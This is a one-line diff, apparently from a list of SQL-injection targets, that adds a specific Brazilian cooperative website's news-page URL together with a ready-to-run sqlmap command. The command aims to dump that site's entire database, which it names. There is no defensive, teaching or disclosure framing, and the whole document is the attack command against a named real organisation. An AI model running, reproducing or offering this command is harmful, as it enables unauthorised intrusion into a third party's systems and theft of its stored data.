@@ -1,0 +1,1 @@
+http://www.coophabgeraldosantana.com.br/noticia.php?codigo=10 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.coophabgeraldosantana.com.br/noticia.php?codigo=10 -D coophabgeraldo --dump-all
